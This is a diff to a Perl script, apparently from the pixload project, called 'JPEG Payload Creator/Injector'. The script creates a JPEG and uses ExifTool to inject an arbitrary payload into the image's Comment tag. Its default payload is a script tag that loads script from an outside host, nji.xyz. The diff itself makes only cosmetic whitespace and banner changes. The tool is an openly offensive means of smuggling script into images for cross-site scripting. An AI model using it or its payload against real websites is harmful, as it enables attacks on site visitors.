@@ -1,6 +1,7 @@
 #!/usr/bin/perl
 #
 # JPEG Payload Creator/Injector
+#
 # coded by chinarulezzz, alexandr.savca89@gmail.com
 #
 # See LICENSE file for copyright and license details.
@@ -24,22 +25,23 @@ GetOptions(
     'payload=s' =>  \my $payload,
     'output=s'  =>  \my $outfile,
 );
-usage(0) if $help;
+usage(0)     if $help;
 usage(1) unless $outfile;
 
 $payload //= '<script src//nji.xyz></script>';
 
 say <<EOF;
-[>|           JPEG Payload Creator          |<]
+[>|      JPEG Payload Creator/Injector      |<]
 
     https://github.com/chinarulezzz/pixload
 
 EOF
 
-create_jpg unless -f $outfile;
+create_jpg              unless -f $outfile;
+
 inject_payload;
 
-say `file $outfile`         if -f '/usr/bin/file';
+say `file       $outfile`   if -f '/usr/bin/file';
 say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
@@ -80,7 +82,9 @@ sub inject_payload {
     say "[>] Injecting payload into comment tag";
 
     my  $exifTool   = Image::ExifTool->new;
+
     my ($ok, $fail) = $exifTool->SetNewValue('Comment', $payload);
+
     die "[✘] Fail to SetNewValue\n" if $fail;
 
     $exifTool->WriteInfo($outfile) || die "[✘] Fail to WriteInfo\n";
